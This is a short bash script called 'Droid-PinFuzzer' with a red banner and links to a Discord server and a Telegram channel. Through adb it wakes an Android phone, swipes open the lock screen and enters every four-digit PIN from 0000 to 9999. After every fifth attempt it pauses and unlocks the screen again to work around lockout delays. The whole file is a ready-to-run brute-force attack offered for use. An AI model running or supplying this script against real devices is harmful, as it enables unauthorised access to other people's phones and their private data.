#!/usr/bin/env bash


echo -e " \e[1;31m
██████╗ ██████╗ ██╗███╗   ██╗      ███████╗██╗   ██╗███████╗███████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║████╗  ██║      ██╔════╝██║   ██║╚══███╔╝╚══███╔╝██╔════╝██╔══██╗
██║  ██║██████╔╝██║██╔██╗ ██║█████╗█████╗  ██║   ██║  ███╔╝   ███╔╝ █████╗  ██████╔╝
██║  ██║██╔═══╝ ██║██║╚██╗██║╚════╝██╔══╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══╝  ██╔══██╗
██████╔╝██║     ██║██║ ╚████║      ██║     ╚██████╔╝███████╗███████╗███████╗██║  ██║
╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
\e[0m
"
echo ---------------------------------------------------
echo -e 'Join Our Discord Server:\e[1;31m https://discord.gg/THJX876\e[0m'

echo -e 'Join Our Telegram Channel:\e[1;31m https://t.me/levelivsec\e[0m'
echo ---------------------------------------------------


echo ---------------------------------------------------
echo -e '\e[1;32mStarting Droid-PinFuzzer\e[0m'
echo ---------------------------------------------------
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85



for i in {0000..9999}; do

    echo -----------
    echo -e "TRYING \e[1;32m$i\e[0m"
    echo -----------
	
    for (( j=0; j<${#i}; j++ )); do
        adb shell input keyevent $((`echo ${i:$j:1}`+7))
    done

    adb shell input keyevent 66
    
    if ! (( `expr $i + 1` % 5 )); then
        adb shell input keyevent 66
        sleep 2
        adb shell input keyevent 82
        adb shell input swipe 407 1211 378 85
    fi
done
